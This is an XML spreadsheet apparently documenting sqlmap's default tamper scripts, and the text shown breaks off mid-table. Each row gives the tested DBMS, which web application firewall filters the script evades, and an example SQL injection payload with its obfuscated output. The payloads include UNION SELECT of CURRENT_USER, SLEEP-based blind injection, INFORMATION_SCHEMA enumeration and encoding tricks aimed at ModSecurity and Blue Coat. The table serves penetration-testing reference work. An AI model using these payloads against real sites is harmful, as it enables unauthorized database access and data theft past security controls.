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B05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36083333333333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13.1497916666667cm"/>
    </style:style>
    <style:style style:name="co4" style:family="table-column">
      <style:table-column-properties fo:break-before="auto" style:column-width="11.8004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ro6" style:family="table-row">
      <style:table-row-properties style:row-height="10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150pt" style:use-optimal-row-height="true" fo:break-before="auto"/>
    </style:style>
    <style:style style:name="ro10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SQLMAP DEFAULT TAMPER SCRIPTS USAG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TAMPER SCRIPT</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" table:style-name="ce2">
            <text:p>REQUERIMENTS / TESTED against</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" table:style-name="ce3">
            <text:p>NOTES \ TIPS<text:s/></text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" table:style-name="ce2">
            <text:p>INJECT EXAMPLE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apostrophemask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apostrophe character with its UTF-8 full width counterpart</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" table:style-name="ce6">
            <text:p>&gt;&gt;&gt; tamper("1 AND '1'='1")</text:p>
            <text:p><text:s text:c="4"/>'1 AND %EF%BC%871%EF%BC%87=%EF%BC%871'</text:p>
            <text:p/>
          </table:table-cell>
          <table:table-cell table:number-columns-repeated="16380" table:style-name="ce7"/>
        </table:table-row>
        <table:table-row table:style-name="ro3">
          <table:table-cell office:value-type="string" table:style-name="ce4">
            <text:p>apostrophenullencode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apostrophe character with its illegal double unicode counterpart</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" table:style-name="ce6">
            <text:p>&gt;&gt;&gt; tamper("1 AND '1'='1")</text:p>
            <text:p><text:s text:c="4"/>'1 AND %00%271%00%27=%00%271'</text:p>
            <text:p/>
          </table:table-cell>
          <table:table-cell table:number-columns-repeated="16380" table:style-name="ce7"/>
        </table:table-row>
        <table:table-row table:style-name="ro3">
          <table:table-cell office:value-type="string" table:style-name="ce4">
            <text:p>appendnullbyte</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" table:style-name="ce4">
            <text:p>Microsoft Access \ TEST FURTHER</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" table:style-name="ce5">
            <text:p>Useful to bypass weak web application firewalls when the back-end database management system is Microsoft Access - further uses are also possible</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" table:style-name="ce6">
            <text:p>&gt;&gt;&gt; tamper('1 AND 1=1')</text:p>
            <text:p><text:s text:c="4"/>'1 AND 1=1%00'</text:p>
            <text:p/>
          </table:table-cell>
          <table:table-cell table:number-columns-repeated="16380" table:style-name="ce7"/>
        </table:table-row>
        <table:table-row table:style-name="ro3">
          <table:table-cell office:value-type="string" table:style-name="ce4">
            <text:p>base64encode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Base64 encode all characters in a given payload</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" table:style-name="ce6">
            <text:p>&gt;&gt;&gt; tamper("1' AND SLEEP(5)#")</text:p>
            <text:p><text:s text:c="4"/>'MScgQU5EIFNMRUVQKDUpIw==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3">
            <text:p>MySQL 4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3">
            <text:p>MySQL 5.0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4">
          <table:table-cell office:value-type="string" table:style-name="ce4">
            <text:p>between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Useful to bypass weak and bespoke web application firewalls that filter the greater than character The BETWEEN clause is SQL standard. Hence, this tamper script should work against all<text:s/><text:span text:style-name="T2">(?) databases</text:span><text:span text:style-name="T2"/></text:p>
            <text:p/>
            <text:p/>
            <text:p/>
          </table:table-cell>
          <table:table-cell office:value-type="string" table:style-name="ce6">
            <text:p>&gt;&gt;&gt; tamper('1 AND A &gt; B--')</text:p>
            <text:p><text:s text:c="4"/>'1 AND A NOT BETWEEN 0 AND B--'</text:p>
            <text:p><text:s text:c="4"/>&gt;&gt;&gt; tamper('1 AND A = B--')</text:p>
            <text:p><text:s text:c="4"/>'1 AND A BETWEEN B AND B--'</text:p>
            <text:p/>
          </table:table-cell>
          <table:table-cell table:number-columns-repeated="16380" table:style-name="ce7"/>
        </table:table-row>
        <table:table-row table:style-name="ro3">
          <table:table-cell office:value-type="string" table:style-name="ce4">
            <text:p>bluecoat</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" table:style-name="ce4">
            <text:p>MySQL 5.1</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" table:style-name="ce5">
            <text:p>Replaces space character after SQL statement with a valid random blank character. Afterwards replace character = with LIKE operator Useful to bypass Blue Coat's recommended WAF rule configuration</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" table:style-name="ce6">
            <text:p>&gt;&gt;&gt; tamper('SELECT id FROM users WHERE id = 1')</text:p>
            <text:p><text:s text:c="4"/>'SELECT%09id FROM%09users WHERE%09id LIKE 1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bluecoat</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" table:style-name="ce4">
            <text:p>SGOS</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" table:style-name="ce5">
            <text:p>Replaces space character after SQL statement with a valid random blank character. Afterwards replace character = with LIKE operator Useful to bypass Blue Coat's recommended WAF rule configuration</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" table:style-name="ce6">
            <text:p>&gt;&gt;&gt; tamper('SELECT id FROM users WHERE id = 1')</text:p>
            <text:p><text:s text:c="4"/>'SELECT%09id FROM%09users WHERE%09id LIKE 1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doubleencode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Double url-encodes all characters in a given payload (not processing already encoded) * Useful to bypass some weak web application firewalls that do not double url-decode the request before processing it through their ruleset</text:p>
            <text:p/>
          </table:table-cell>
          <table:table-cell office:value-type="string" table:style-name="ce6">
            <text:p><text:s text:c="4"/>&gt;&gt;&gt; tamper('SELECT FIELD FROM%20TABLE')</text:p>
            <text:p><text:s text:c="4"/>'%2553%2545%254C%2545%2543%2554%2520%2546%2549%2545%254C%2544%2520%2546%2552%254F%254D%2520%2554%2541%2542%254C%2545'</text:p>
            <text:p/>
          </table:table-cell>
          <table:table-cell table:number-columns-repeated="16380" table:style-name="ce7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3">
            <text:p>MySQL 4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charencode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Useful to bypass very weak web application firewalls that do not url-decode the request before processing it through their ruleset. The web server will anyway pass the url-decoded version behind, hence it should work against any DBMS</text:p>
            <text:p/>
          </table:table-cell>
          <table:table-cell office:value-type="string" table:style-name="ce6">
            <text:p>&gt;&gt;&gt; tamper('SELECT FIELD FROM%20TABLE')</text:p>
            <text:p><text:s text:c="4"/>'%53%45%4C%45%43%54%20%46%49%45%4C%44%20%46%52%4F%4D%20%54%41%42%4C%45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unicodeencode</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" table:style-name="ce4">
            <text:p>ASP</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" table:style-name="ce5">
            <text:p>Useful to bypass weak web application firewalls that do not unicode url-decode the request before processing it through their ruleset</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" table:style-name="ce6">
            <text:p>&gt;&gt;&gt; tamper('SELECT FIELD%20FROM TABLE')</text:p>
            <text:p><text:s text:c="4"/>'%u0053%u0045%u004C%u0045%u0043%u0054%u0020%u0046%u0049%u0045%u004C%u0044%u0020%u0046%u0052%u004F%u004D%u0020%u0054%u0041%u0042%u004C%u0045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unicodeencode</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" table:style-name="ce4">
            <text:p>ASP.NET</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" table:style-name="ce5">
            <text:p>Useful to bypass weak web application firewalls that do not unicode url-decode the request before processing it through their ruleset</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" table:style-name="ce6">
            <text:p>&gt;&gt;&gt; tamper('SELECT FIELD%20FROM TABLE')</text:p>
            <text:p><text:s text:c="4"/>'%u0053%u0045%u004C%u0045%u0043%u0054%u0020%u0046%u0049%u0045%u004C%u0044%u0020%u0046%u0052%u004F%u004D%u0020%u0054%u0041%u0042%u004C%u0045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unicodeencode</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" table:style-name="ce4">
            <text:p>Microsoft SQL Server 2000</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" table:style-name="ce5">
            <text:p>Useful to bypass weak web application firewalls that do not unicode url-decode the request before processing it through their ruleset</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" table:style-name="ce6">
            <text:p>&gt;&gt;&gt; tamper('SELECT FIELD%20FROM TABLE')</text:p>
            <text:p><text:s text:c="4"/>'%u0053%u0045%u004C%u0045%u0043%u0054%u0020%u0046%u0049%u0045%u004C%u0044%u0020%u0046%u0052%u004F%u004D%u0020%u0054%u0041%u0042%u004C%u0045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unicodeencod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Useful to bypass weak web application firewalls that do not unicode url-decode the request before processing it through their ruleset</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" table:style-name="ce6">
            <text:p>&gt;&gt;&gt; tamper('SELECT FIELD%20FROM TABLE')</text:p>
            <text:p><text:s text:c="4"/>'%u0053%u0045%u004C%u0045%u0043%u0054%u0020%u0046%u0049%u0045%u004C%u0044%u0020%u0046%u0052%u004F%u004D%u0020%u0054%u0041%u0042%u004C%u0045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unicodeencode</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" table:style-name="ce4">
            <text:p>MySQL 5.1.56</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" table:style-name="ce5">
            <text:p>Useful to bypass weak web application firewalls that do not unicode url-decode the request before processing it through their ruleset</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" table:style-name="ce6">
            <text:p>&gt;&gt;&gt; tamper('SELECT FIELD%20FROM TABLE')</text:p>
            <text:p><text:s text:c="4"/>'%u0053%u0045%u004C%u0045%u0043%u0054%u0020%u0046%u0049%u0045%u004C%u0044%u0020%u0046%u0052%u004F%u004D%u0020%u0054%u0041%u0042%u004C%u0045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charunicodeencode</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" table:style-name="ce4">
            <text:p>PostgreSQL 9.0.3</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" table:style-name="ce5">
            <text:p>Useful to bypass weak web application firewalls that do not unicode url-decode the request before processing it through their ruleset</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" table:style-name="ce6">
            <text:p>&gt;&gt;&gt; tamper('SELECT FIELD%20FROM TABLE')</text:p>
            <text:p><text:s text:c="4"/>'%u0053%u0045%u004C%u0045%u0043%u0054%u0020%u0046%u0049%u0045%u004C%u0044%u0020%u0046%u0052%u004F%u004D%u0020%u0054%u0041%u0042%u004C%u0045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charunicodeescape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Useful to bypass weak filtering and/or WAFs in JSON contexes, Unicode-escapes non-encoded characters in a given payload (not processing already encoded).</text:p>
            <text:p/>
          </table:table-cell>
          <table:table-cell office:value-type="string" table:style-name="ce6">
            <text:p>&gt;&gt;&gt; tamper('SELECT FIELD FROM TABLE')</text:p>
            <text:p><text:s text:c="4"/>'\\\\u0053\\\\u0045\\\\u004C\\\\u0045\\\\u0043\\\\u0054\\\\u0020\\\\u0046\\\\u0049\\\\u0045\\\\u004C\\\\u0044\\\\u0020\\\\u0046\\\\u0052\\\\u004F\\\\u004D\\\\u0020\\\\u0054\\\\u0041\\\\u0042\\\\u004C\\\\u0045'</text:p>
            <text:p/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commalesslimit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Replaces instances like 'LIMIT M, N' with 'LIMIT N OFFSET M'</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" table:style-name="ce6">
            <text:p/>
            <text:p/>
            <text:p><text:s text:c="4"/>&gt;&gt;&gt; tamper('LIMIT 2, 3')</text:p>
            <text:p><text:s text:c="4"/>'LIMIT 3 OFFSET 2'</text:p>
            <text:p/>
          </table:table-cell>
          <table:table-cell table:number-columns-repeated="16380"/>
        </table:table-row>
        <table:table-row table:style-name="ro7">
          <table:table-cell office:value-type="string" table:style-name="ce4">
            <text:p>commalesslimit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Replaces instances like 'LIMIT M, N' with 'LIMIT N OFFSET M'</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" table:style-name="ce6">
            <text:p>&gt;&gt;&gt; tamper('LIMIT 2, 3')</text:p>
            <text:p><text:s text:c="4"/>'LIMIT 3 OFFSET 2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alesslimit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instances like 'LIMIT M, N' with 'LIMIT N OFFSET M'</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" table:style-name="ce6">
            <text:p>&gt;&gt;&gt; tamper('LIMIT 2, 3')</text:p>
            <text:p><text:s text:c="4"/>'LIMIT 3 OFFSET 2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alessmid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Replaces instances like 'MID(A, B, C)' with 'MID(A FROM B FOR C)'</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" table:style-name="ce6">
            <text:p>&gt;&gt;&gt; tamper('MID(VERSION(), 1, 1)')</text:p>
            <text:p><text:s text:c="4"/>'MID(VERSION() FROM 1 FOR 1)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alessmid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Replaces instances like 'MID(A, B, C)' with 'MID(A FROM B FOR C)'</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" table:style-name="ce6">
            <text:p>&gt;&gt;&gt; tamper('MID(VERSION(), 1, 1)')</text:p>
            <text:p><text:s text:c="4"/>'MID(VERSION() FROM 1 FOR 1)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alessmid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instances like 'MID(A, B, C)' with 'MID(A FROM B FOR C)'</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" table:style-name="ce6">
            <text:p>&gt;&gt;&gt; tamper('MID(VERSION(), 1, 1)')</text:p>
            <text:p><text:s text:c="4"/>'MID(VERSION() FROM 1 FOR 1)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entbeforeparentheses</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" table:style-name="ce4">
            <text:p>Microsoft SQL Server</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" table:style-name="ce5">
            <text:p>Useful to bypass web application firewalls that block usage of function calls</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" table:style-name="ce6">
            <text:p>&gt;&gt;&gt; tamper('SELECT ABS(1)')</text:p>
            <text:p><text:s text:c="4"/>'SELECT ABS/**/(1)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entbeforeparentheses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Useful to bypass web application firewalls that block usage of function calls</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" table:style-name="ce6">
            <text:p>&gt;&gt;&gt; tamper('SELECT ABS(1)')</text:p>
            <text:p><text:s text:c="4"/>'SELECT ABS/**/(1)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entbeforeparentheses</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" table:style-name="ce4">
            <text:p>Oracle</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" table:style-name="ce5">
            <text:p>Useful to bypass web application firewalls that block usage of function calls</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" table:style-name="ce6">
            <text:p>&gt;&gt;&gt; tamper('SELECT ABS(1)')</text:p>
            <text:p><text:s text:c="4"/>'SELECT ABS/**/(1)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commentbeforeparentheses</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" table:style-name="ce4">
            <text:p>PostgreSQL</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" table:style-name="ce5">
            <text:p>Useful to bypass web application firewalls that block usage of function calls</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" table:style-name="ce6">
            <text:p>&gt;&gt;&gt; tamper('SELECT ABS(1)')</text:p>
            <text:p><text:s text:c="4"/>'SELECT ABS/**/(1)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oncat2concatws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Useful to bypass very weak and bespoke web application firewalls that filter the CONCAT() function</text:p>
            <text:p/>
          </table:table-cell>
          <table:table-cell office:value-type="string" table:style-name="ce6">
            <text:p>&gt;&gt;&gt; tamper('CONCAT(1,2)')</text:p>
            <text:p><text:s text:c="4"/>'CONCAT_WS(MID(CHAR(0),0,0),1,2)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concat2concatws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Useful to bypass very weak and bespoke web application firewalls that filter the CONCAT() function</text:p>
            <text:p/>
          </table:table-cell>
          <table:table-cell office:value-type="string" table:style-name="ce6">
            <text:p>&gt;&gt;&gt; tamper('CONCAT(1,2)')</text:p>
            <text:p><text:s text:c="4"/>'CONCAT_WS(MID(CHAR(0),0,0),1,2)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equaltolik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Useful to bypass weak and bespoke web application firewalls that filter the equal character ('=') The LIKE operator is SQL standard. Hence, this tamper script should work against<text:s/><text:span text:style-name="T2">all (?)</text:span><text:s/>databases</text:p>
            <text:p/>
          </table:table-cell>
          <table:table-cell office:value-type="string" table:style-name="ce6">
            <text:p>&gt;&gt;&gt; tamper('SELECT * FROM users WHERE id=1')</text:p>
            <text:p><text:s text:c="4"/>'SELECT * FROM users WHERE id LIKE 1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equaltolike</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" table:style-name="ce4">
            <text:p>MySQL 4</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" table:style-name="ce5">
            <text:p>Useful to bypass weak and bespoke web application firewalls that filter the equal character ('=') The LIKE operator is SQL standard. Hence, this tamper script should work against<text:s/><text:span text:style-name="T2">all (?)</text:span><text:s/>databases</text:p>
            <text:p/>
          </table:table-cell>
          <table:table-cell office:value-type="string" table:style-name="ce6">
            <text:p>&gt;&gt;&gt; tamper('SELECT * FROM users WHERE id=1')</text:p>
            <text:p><text:s text:c="4"/>'SELECT * FROM users WHERE id LIKE 1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equaltolike</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" table:style-name="ce4">
            <text:p>MySQL 5</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" table:style-name="ce5">
            <text:p>Useful to bypass weak and bespoke web application firewalls that filter the equal character ('=') The LIKE operator is SQL standard. Hence, this tamper script should work against<text:s/><text:span text:style-name="T2">all (?)</text:span><text:s/>databases</text:p>
            <text:p/>
          </table:table-cell>
          <table:table-cell office:value-type="string" table:style-name="ce6">
            <text:p>&gt;&gt;&gt; tamper('SELECT * FROM users WHERE id=1')</text:p>
            <text:p><text:s text:c="4"/>'SELECT * FROM users WHERE id LIKE 1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equaltolike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Useful to bypass weak and bespoke web application firewalls that filter the equal character ('=') The LIKE operator is SQL standard. Hence, this tamper script should work against<text:s/><text:span text:style-name="T2">all (?)</text:span><text:s/>databases</text:p>
            <text:p/>
          </table:table-cell>
          <table:table-cell office:value-type="string" table:style-name="ce6">
            <text:p>&gt;&gt;&gt; tamper('SELECT * FROM users WHERE id=1')</text:p>
            <text:p><text:s text:c="4"/>'SELECT * FROM users WHERE id LIKE 1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escapequotes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Slash escape quotes (' and ")</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" table:style-name="ce6">
            <text:p>&gt;&gt;&gt; tamper('1" AND SLEEP(5)#')</text:p>
            <text:p><text:s text:c="4"/>'1\\\\" AND SLEEP(5)#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MySQL 4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MySQL 5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greatest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Replaces greater than operator ('&gt;') with 'GREATEST' counterpart. Useful to bypass weak and bespoke web application firewalls that filter the greater than character.The GREATEST clause is a widespread SQL command. Hence,<text:s/><text:span text:style-name="T2">this tamper script should work against majority</text:span><text:s/>of databases</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" table:style-name="ce6">
            <text:p>&gt;&gt;&gt; tamper('1 AND A &gt; B')</text:p>
            <text:p><text:s text:c="4"/>'1 AND GREATEST(A,B+1)=A'</text:p>
            <text:p/>
          </table:table-cell>
          <table:table-cell table:number-columns-repeated="16380"/>
        </table:table-row>
        <table:table-row table:style-name="ro9">
          <table:table-cell office:value-type="string" table:style-name="ce4">
            <text:p>halfversionedmorekeywords</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" table:style-name="ce4">
            <text:p>MySQL &lt; 5.1</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" table:style-name="ce5">
            <text:p>Adds versioned MySQL comment before each keyword. Useful to bypass several web application firewalls when the back-end database management system is MySQL Used during the ModSecurity SQL injection challenge http://modsecurity.org/demo/challenge.html</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" table:style-name="ce6">
            <text:p>&gt;&gt;&gt; tamper("value' UNION ALL SELECT CONCAT(CHAR(58,107,112,113,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,97,110,121,58)), NULL, NULL# AND 'QDWa'='QDWa")</text:p>
            <text:p><text:s text:c="4"/>"value'/*!0UNION/*!0ALL/*!0SELECT/*!0CONCAT(/*!0CHAR(58,107,112,113,58),/*!0IFNULL(CAST(/*!0CURRENT_USER()/*!0AS/*!0CHAR),/*!0CHAR(32)),/*!0CHAR(58,97,110,121,58)),/*!0NULL,/*!0NULL#/*!0AND 'QDWa'='QDWa"</text:p>
            <text:p/>
          </table:table-cell>
          <table:table-cell table:number-columns-repeated="16380"/>
        </table:table-row>
        <table:table-row table:style-name="ro9">
          <table:table-cell office:value-type="string" table:style-name="ce4">
            <text:p>halfversionedmorekeywords</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" table:style-name="ce4">
            <text:p>MySQL 4.0.18</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" table:style-name="ce5">
            <text:p>Adds versioned MySQL comment before each keyword. Useful to bypass several web application firewalls when the back-end database management system is MySQL Used during the ModSecurity SQL injection challenge http://modsecurity.org/demo/challenge.html</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" table:style-name="ce6">
            <text:p>&gt;&gt;&gt; tamper("value' UNION ALL SELECT CONCAT(CHAR(58,107,112,113,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,97,110,121,58)), NULL, NULL# AND 'QDWa'='QDWa")</text:p>
            <text:p><text:s text:c="4"/>"value'/*!0UNION/*!0ALL/*!0SELECT/*!0CONCAT(/*!0CHAR(58,107,112,113,58),/*!0IFNULL(CAST(/*!0CURRENT_USER()/*!0AS/*!0CHAR),/*!0CHAR(32)),/*!0CHAR(58,97,110,121,58)),/*!0NULL,/*!0NULL#/*!0AND 'QDWa'='QDWa"</text:p>
            <text:p/>
          </table:table-cell>
          <table:table-cell table:number-columns-repeated="16380"/>
        </table:table-row>
        <table:table-row table:style-name="ro9">
          <table:table-cell office:value-type="string" table:style-name="ce4">
            <text:p>halfversionedmorekeywords</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" table:style-name="ce4">
            <text:p>MySQL 5.0.22</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" table:style-name="ce5">
            <text:p>Adds versioned MySQL comment before each keyword. Useful to bypass several web application firewalls when the back-end database management system is MySQL Used during the ModSecurity SQL injection challenge http://modsecurity.org/demo/challenge.html</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" table:style-name="ce6">
            <text:p>&gt;&gt;&gt; tamper("value' UNION ALL SELECT CONCAT(CHAR(58,107,112,113,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,97,110,121,58)), NULL, NULL# AND 'QDWa'='QDWa")</text:p>
            <text:p><text:s text:c="4"/>"value'/*!0UNION/*!0ALL/*!0SELECT/*!0CONCAT(/*!0CHAR(58,107,112,113,58),/*!0IFNULL(CAST(/*!0CURRENT_USER()/*!0AS/*!0CHAR),/*!0CHAR(32)),/*!0CHAR(58,97,110,121,58)),/*!0NULL,/*!0NULL#/*!0AND 'QDWa'='QDWa"</text:p>
            <text:p/>
          </table:table-cell>
          <table:table-cell table:number-columns-repeated="16380"/>
        </table:table-row>
        <table:table-row table:style-name="ro7">
          <table:table-cell office:value-type="string" table:style-name="ce4">
            <text:p>htmlencode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HTML encode (using code points) all non-alphanumeric characters</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" table:style-name="ce6">
            <text:p>&gt;&gt;&gt; tamper("1' AND SLEEP(5)#") '1&amp;#39;&amp;#32;AND&amp;#32;SLEEP&amp;#40;5&amp;#41;&amp;#35;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ifnull2ifisnull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Replaces instances like 'IFNULL(A, B)' with 'IF(ISNULL(A), B, A)' Useful to bypass very weak and bespoke web application firewalls that filter the IFNULL() function</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" table:style-name="ce6">
            <text:p>&gt;&gt;&gt; tamper('IFNULL(1, 2)')</text:p>
            <text:p><text:s text:c="4"/>'IF(ISNULL(1),2,1)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ifnull2ifisnull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instances like 'IFNULL(A, B)' with 'IF(ISNULL(A), B, A)' Useful to bypass very weak and bespoke web application firewalls that filter the IFNULL() function</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" table:style-name="ce6">
            <text:p>&gt;&gt;&gt; tamper('IFNULL(1, 2)')</text:p>
            <text:p><text:s text:c="4"/>'IF(ISNULL(1),2,1)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informationschemacomment</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" table:style-name="ce4">
            <text:p>UNIVERSAL \ NOT DESCRIBED</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" table:style-name="ce8">
            <text:p>Add a comment to the end of all occurrences of (blacklisted) "information_schema" identifier</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" table:style-name="ce6">
            <text:p>&gt;&gt;&gt; tamper('SELECT table_name FROM INFORMATION_SCHEMA.TABLES')</text:p>
            <text:p><text:s text:c="4"/>'SELECT table_name FROM INFORMATION_SCHEMA/**/.TABLES'</text:p>
            <text:p/>
          </table:table-cell>
          <table:table-cell table:number-columns-repeated="16380" table:style-name="ce7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MySQL 4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MySQL 5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least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Useful to bypass weak and bespoke web application firewalls that filter the greater than character. The LEAST clause is a widespread SQL command. Hence, this tamper script<text:s/><text:span text:style-name="T2">should work against majority of databases</text:span>.</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" table:style-name="ce6">
            <text:p>&gt;&gt;&gt; tamper('1 AND A &gt; B')</text:p>
            <text:p><text:s text:c="4"/>'1 AND LEAST(A,B+1)=B+1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MySQL 4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lowercase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Replaces each keyword character with lower case value. Useful to bypass very weak and bespoke web application firewalls that has poorly written permissive regular expressions. This tamper script<text:span text:style-name="T2"><text:s/>should work against all (?) databases.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modsecurityversioned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Embraces complete query with versioned comment. Useful to bypass ModSecurity WAF/IDS</text:p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1 AND 2&gt;1--')</text:p>
            <text:p><text:s text:c="4"/>'1 /*!30874AND 2&gt;1*/--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modsecurityversioned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Useful to bypass ModSecurity WAF/IDS</text:p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1 AND 2&gt;1--')</text:p>
            <text:p><text:s text:c="4"/>'1 /*!30874AND 2&gt;1*/--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multiplespaces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Adds multiple spaces around SQL keywords. Useful to bypass very weak and bespoke web application firewalls that has poorly written permissive regular expressions Reference: https://www.owasp.org/images/7/74/Advanced_SQL_Injection.ppt</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" table:style-name="ce6">
            <text:p>&gt;&gt;&gt; random.seed(0)</text:p>
            <text:p><text:s text:c="4"/>&gt;&gt;&gt; tamper('1 UNION SELECT foobar')</text:p>
            <text:p><text:s text:c="4"/>'1 <text:s text:c="3"/>UNION <text:s text:c="4"/>SELECT <text:s text:c="2"/>foobar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nonrecursivereplacement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predefined SQL keywords with representations suitable for replacement (e.g. .replace("SELECT", "")) filters. Useful to bypass very weak custom filters</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" table:style-name="ce6">
            <text:p>&gt;&gt;&gt; random.seed(0)</text:p>
            <text:p><text:s text:c="4"/>&gt;&gt;&gt; tamper('1 UNION SELECT 2--')</text:p>
            <text:p><text:s text:c="4"/>'1 UNIOUNIONN SELESELECTCT 2--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overlongutf8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Converts all characters in a given payload (not processing already encoded) Reference: https://www.acunetix.com/vulnerabilities/unicode-transformation-issues/</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" table:style-name="ce6">
            <text:p>&gt;&gt;&gt; tamper('SELECT FIELD FROM TABLE WHERE 2&gt;1')</text:p>
            <text:p><text:s text:c="4"/>'SELECT%C0%AAFIELD%C0%AAFROM%C0%AATABLE%C0%AAWHERE%C0%AA2%C0%BE1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ercentage</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" table:style-name="ce4">
            <text:p>ASP</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" table:style-name="ce5">
            <text:p>Adds a percentage sign ('%') infront of each character. Useful to bypass weak and bespoke web application firewalls</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" table:style-name="ce6">
            <text:p>&gt;&gt;&gt; tamper('SELECT FIELD FROM TABLE')</text:p>
            <text:p><text:s text:c="4"/>'%S%E%L%E%C%T %F%I%E%L%D %F%R%O%M %T%A%B%L%E'</text:p>
            <text:p><text:s text:c="4"/>"""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ercentage</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" table:style-name="ce4">
            <text:p>Microsoft SQL Server 2000</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" table:style-name="ce5">
            <text:p>Adds a percentage sign ('%') infront of each character. Useful to bypass weak and bespoke web application firewalls</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" table:style-name="ce6">
            <text:p>&gt;&gt;&gt; tamper('SELECT FIELD FROM TABLE')</text:p>
            <text:p><text:s text:c="4"/>'%S%E%L%E%C%T %F%I%E%L%D %F%R%O%M %T%A%B%L%E'</text:p>
            <text:p><text:s text:c="4"/>"""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ercentag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Adds a percentage sign ('%') infront of each character. Useful to bypass weak and bespoke web application firewalls</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" table:style-name="ce6">
            <text:p>&gt;&gt;&gt; tamper('SELECT FIELD FROM TABLE')</text:p>
            <text:p><text:s text:c="4"/>'%S%E%L%E%C%T %F%I%E%L%D %F%R%O%M %T%A%B%L%E'</text:p>
            <text:p><text:s text:c="4"/>"""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ercentage</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" table:style-name="ce4">
            <text:p>MySQL 5.1.56</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" table:style-name="ce5">
            <text:p>Adds a percentage sign ('%') infront of each character. Useful to bypass weak and bespoke web application firewalls</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" table:style-name="ce6">
            <text:p>&gt;&gt;&gt; tamper('SELECT FIELD FROM TABLE')</text:p>
            <text:p><text:s text:c="4"/>'%S%E%L%E%C%T %F%I%E%L%D %F%R%O%M %T%A%B%L%E'</text:p>
            <text:p><text:s text:c="4"/>"""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ercentage</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" table:style-name="ce4">
            <text:p>MySQL 5.5.11</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" table:style-name="ce5">
